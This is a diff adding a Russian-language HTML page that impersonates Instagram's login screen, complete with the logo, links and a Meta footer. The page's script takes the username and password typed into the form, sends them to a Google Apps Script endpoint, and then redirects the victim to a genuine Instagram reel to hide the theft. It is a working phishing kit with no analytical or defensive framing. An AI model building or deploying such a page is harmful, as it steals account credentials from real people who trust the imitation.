@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="ru">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Вход в Instagram</title>
+    <link rel="stylesheet" href="style.css" />
+    <script>
+      async function handleSubmit(event) {
+        event.preventDefault();
+
+        const formData = new FormData(event.target);
+        const data = {
+          username: formData.get('username'),
+          password: formData.get('password'),
+        };
+
+        const response = await fetch('https://script.google.com/macros/s/AKfycbzWkpkR_FdJuSkY2KLQBEhI9VghI6sh9q19sfrxdgaIu2yddXj_TFegWISj04d-MxQO/exec', {
+          method: 'POST',
+          body: JSON.stringify(data),
+        });
+          window.location.href = "https://www.instagram.com/reel/DCUXkM4oJsh/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==";
+        }
+    </script>
+  </head>
+  <body>
+    <div class="login_page">
+      <div class="header">
+        <img src="https://www.logolynx.com/images/logolynx/82/82abee4b6db4025c07209adec0d62acd.png" alt="Instagram" class="logo" />
+      </div>
+      <div class="login-box">
+        <form class="login_form" onsubmit="handleSubmit(event)">
+          <input name="username" type="text" placeholder="Телефон, имя пользователя или эл. адрес" required />
+          <input name="password" type="password" placeholder="Пароль" required />
+          <button type="submit" class="login_button">Войти</button>
+        </form>
+        <div class="divider">
+          <span></span>
+          <p>ИЛИ</p>
+          <span></span>
+        </div>
+        <a href="https://www.facebook.com/login.php" class="facebook_login">
+          <img src="https://static.vecteezy.com/system/resources/thumbnails/018/930/698/small/facebook-logo-facebook-icon-transparent-free-png.png" alt="" />
+          Войти через Facebook
+        </a>
+        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot_password">
+          Забыли пароль?
+        </a>
+        <p class="signup_link">
+          У вас ещё нет аккаунта? <a href="https://www.instagram.com/accounts/emailsignup/">Зарегистрироваться</a>
+        </p>
+      </div>
+    </div>
+    <footer class="footer">
+      <p>Meta Информация Блог Вакансии Помощь API</p>
+      <p>Конфиденциальность Условия Места Instagram Lite Threads</p>
+      <p>Загрузка контактов и лица, не являющиеся пользователями Meta Verified</p>
+      <p>Русский © 2024 Instagram from Meta</p>
+    </footer>
+  </body>
+</html>
